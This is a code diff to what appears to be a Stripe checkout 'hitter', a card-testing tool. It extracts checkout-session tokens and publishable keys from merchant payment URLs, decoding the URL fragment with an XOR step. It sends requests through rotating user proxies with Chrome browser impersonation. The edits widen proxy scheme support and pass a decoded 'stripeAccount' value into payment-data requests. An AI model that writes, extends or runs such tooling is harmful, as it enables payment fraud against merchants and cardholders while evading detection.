@@ -94,7 +94,11 @@ class StripeAPIExtractor:
             proxies = None
             if proxy_data:
                 auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
-                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                server = proxy_data['server']
+                scheme = server.split('://')[0] if '://' in server else 'http'
+                server_host = server.split('://')[-1]
+                proxy_url = f"{scheme}://{auth}{server_host}"
+
                 proxies = {"http": proxy_url, "https": proxy_url}
                 
             loop = asyncio.get_event_loop()
@@ -191,7 +195,11 @@ class StripeAPIExtractor:
             proxies = None
             if proxy_data:
                 auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
-                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                server = proxy_data['server']
+                scheme = server.split('://')[0] if '://' in server else 'http'
+                server_host = server.split('://')[-1]
+                proxy_url = f"{scheme}://{auth}{server_host}"
+
                 proxies = {"http": proxy_url, "https": proxy_url}
                 
             invoicedata_url = f"https://invoicedata.stripe.com/hosted_invoice_page/{merchant_token}/{invoice_secret}"
@@ -1056,7 +1064,11 @@ class StripeAPIHitter:
                 if proxy_data:
                     result['proxy_raw'] = proxy_data['raw']
                     auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
-                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                    server = proxy_data['server']
+                    scheme = server.split('://')[0] if '://' in server else 'http'
+                    server_host = server.split('://')[-1]
+                    proxy_url = f"{scheme}://{auth}{server_host}"
+
                     proxies = {"http": proxy_url, "https": proxy_url}
 
                 is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
@@ -1915,8 +1927,12 @@ class ConcurrentHitter:
                 proxy_data = await ProxyManager.get_random(self.user_id)
                 proxies = None
                 if proxy_data:
-                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
-                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
+                    server = proxy_data['server']
+                    scheme = server.split('://')[0] if '://' in server else 'http'
+                    server_host = server.split('://')[-1]
+                    proxy_url = f"{scheme}://{auth}{server_host}"
+
                     proxies = {"http": proxy_url, "https": proxy_url}
                 
                 async with ChromeSession(impersonate="chrome120", proxies=proxies) as s:
@@ -1976,6 +1992,7 @@ class ConcurrentHitter:
         # Try extracting CS and PK directly from URL first to bypass network request entirely
         cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
         pk_key = None
+        stripe_account = None
         hash_idx = self.url.find('#')
         if hash_idx != -1:
             import urllib.parse, base64, json
@@ -1986,12 +2003,13 @@ class ConcurrentHitter:
                 json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                 data = json.loads(json_str)
                 pk_key = data.get('apiKey')
+                stripe_account = data.get('stripeAccount')
             except: pass
 
         if cs_token and pk_key:
             if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Instantly extracted Stripe keys..."})
-            self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
-            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+            self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
+            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
             if api_data.get('success'):
                 self.url_info['amount'] = api_data.get('amount')
                 self.url_info['raw_amount'] = api_data.get('raw_amount')
@@ -2012,8 +2030,12 @@ class ConcurrentHitter:
                 proxy_data = await ProxyManager.get_random(self.user_id)
                 proxies = None
                 if proxy_data:
-                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
-                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
+                    server = proxy_data['server']
+                    scheme = server.split('://')[0] if '://' in server else 'http'
+                    server_host = server.split('://')[-1]
+                    proxy_url = f"{scheme}://{auth}{server_host}"
+
                     proxies = {"http": proxy_url, "https": proxy_url}
                 
                 loop = asyncio.get_event_loop()
